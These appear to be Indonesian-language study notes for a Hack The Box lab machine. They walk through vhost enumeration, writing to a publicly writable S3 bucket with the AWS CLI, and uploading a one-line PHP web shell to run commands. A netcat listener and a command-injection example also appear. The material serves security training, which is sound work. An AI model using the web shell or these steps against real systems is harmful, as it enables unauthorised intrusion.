```
=== HTB Starting Point Tier 2 - Resume Materi ===
[14 Mei 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 MACHINE: THREE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Difficulty : Very Easy | OS : Linux
Tema       : Cloud misconfiguration → Web Shell → RCE
Skill      : vhost enumeration, S3 bucket abuse, PHP web shell

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR SERANGAN (ATTACK CHAIN)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Nmap scan          → temukan port & service
2. Web recon          → temukan domain dari halaman Contact
3. Edit /etc/hosts    → mapping domain ke IP target
4. Gobuster vhost     → temukan subdomain s3.thetoppers.htb
5. AWS CLI            → list bucket, konfirmasi bucket terhubung ke web root
6. Upload web shell   → shell.php masuk ke bucket via aws s3 cp
7. RCE via browser    → eksekusi command lewat URL parameter
8. find + cat         → cari dan baca flag

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 KONSEP PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/etc/hosts  = file DNS lokal di Linux
              Komputer cek file ini SEBELUM tanya ke DNS server manapun
              Format : [IP]    [domain]
              Contoh : 10.10.10.1    target.htb

Virtual Host= satu IP bisa hosting banyak website sekaligus
              Server bedain website berdasarkan header "Host" di request HTTP
              Makanya vhost enumeration penting untuk temukan subdomain tersembunyi

S3 Bucket   = layanan penyimpanan file cloud milik Amazon (AWS)
              Ibaratnya : folder raksasa di internet
              Bahaya jika : bucket bisa ditulis publik DAN terhubung ke web root
              → siapapun bisa upload file apapun termasuk web shell

Entry Point = titik masuk pertama ke sistem yang berhasil dieksploitasi
              Di machine ini : S3 bucket yang misconfigured (bisa ditulis publik)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TIGA JENIS RCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Web Shell
   Cara   : upload file PHP → akses via URL → output di browser
   Contoh : shell.php?cmd=whoami
   Limit  : satu command per request, tidak interaktif

2. Reverse Shell
   Cara   : payload "nelpon balik" ke komputer kamu
             kamu listening duluan → server konek ke kamu
   Tool   : netcat (nc -lvnp 4444)
   Lebih  : interaktif penuh, bisa jalankan program apapun
   Cocok  : kalau butuh akses shell penuh jangka panjang

3. Bind Shell
   Cara   : server yang listening, kamu yang konek
   Jarang : karena firewall biasanya blokir koneksi masuk ke server

4. Command Injection
   Cara   : suntik command lewat input form/URL yang tidak disanitasi
   Contoh : ?ip=8.8.8.8; whoami
   Tidak  : perlu upload file apapun

5. RCE via CVE
   Cara   : exploit bug di versi software tertentu yang sudah diketahui publik
   Tool   : searchsploit, ExploitDB, Metasploit
   Modal  : versi software dari hasil nmap -sV

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TOOLS & COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ NMAP ]
nmap -sV -sC -T4 [IP]
  -sV  : deteksi versi service yang berjalan
  -sC  : jalankan default scripts (info tambahan otomatis)
  -T4  : kecepatan scan (1 paling lambat, 5 paling cepat)

[ GOBUSTER - vhost mode ]
gobuster vhost -u http://[domain] -w [wordlist] --append-domain
  vhost          : mode enumerasi virtual host / subdomain
  -u             : target URL
  -w             : wordlist
  --append-domain: otomatis tambahkan domain utama ke tiap kata di wordlist

[ GOBUSTER - dir mode ]
gobuster dir -u http://[domain] -w [wordlist]
  dir  : mode enumerasi direktori & file tersembunyi

[ FFUF - vhost mode ]
ffuf -u http://[domain] -H "Host: FUZZ.[domain]" -w [wordlist] -fs [size]
  -H       : set header HTTP secara manual
  FUZZ     : kata kunci yang akan diganti wordlist
  -fs      : filter response berdasarkan ukuran (hapus false positive)

[ AWS CLI ]
aws configure
  → setup credentials (isi dummy jika bucket misconfigured)
  → Access Key ID, Secret Key, Region, Output format

aws s3 ls --no-sign-request --endpoint-url http://[s3-subdomain]
  → list semua bucket yang ada

aws s3 ls s3://[nama-bucket] --no-sign-request --endpoint-url http://[s3-subdomain]
  → list isi bucket tertentu

aws s3 cp [file-lokal] s3://[nama-bucket] --no-sign-request --endpoint-url http://[s3-subdomain]
  cp             : copy file dari lokal ke bucket
  --no-sign-request : kirim tanpa credentials/signature
  --endpoint-url : arahkan ke server target, bukan Amazon asli

[ WEB SHELL ]
Buat file  : echo '<?php system($_GET["cmd"]); ?>' > shell.php
Akses RCE  : http://[domain]/shell.php?cmd=[command-linux]
Contoh     : shell.php?cmd=whoami
             shell.php?cmd=find / -name flag.txt
             shell.php?cmd=cat /var/www/flag.txt

[ LINUX - cari file ]
find / -name flag.txt
  /      : mulai pencarian dari root (seluruh sistem)
  -name  : cari berdasarkan nama file

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Misconfigured  = konfigurasi yang salah/tidak aman
               Di sini : bucket S3 bisa ditulis & dibaca siapapun tanpa auth
Web Root       = folder di server yang jadi "rumah" file website
               File di sini langsung bisa diakses via browser
Web Shell      = file script (PHP dll) yang disisipkan ke server
               untuk eksekusi command dari jarak jauh via browser
False Positive = hasil scan yang muncul tapi sebetulnya tidak valid
               Di ffuf : semua subdomain dapat status 200 dengan size sama
               Solusi  : filter pakai -fs [ukuran-yang-muncul-terus]
www-data       = user default yang dipakai Apache untuk jalankan web server
               Jika whoami = www-data, berarti kamu eksekusi sebagai Apache

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PELAJARAN DARI MACHINE INI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
→ Domain di email (bagian setelah @) = domain website
→ Satu IP bisa punya banyak subdomain tersembunyi → selalu enumerate vhost
→ S3 bucket yang terhubung ke web root + bisa ditulis publik = celah kritis
→ Web shell PHP berbahaya karena fungsi system() bisa eksekusi command Linux
→ Selalu pakai --no-sign-request + --endpoint-url saat interaksi ke S3 lokal
→ Akses web shell harus lewat domain utama (Apache), bukan subdomain S3
```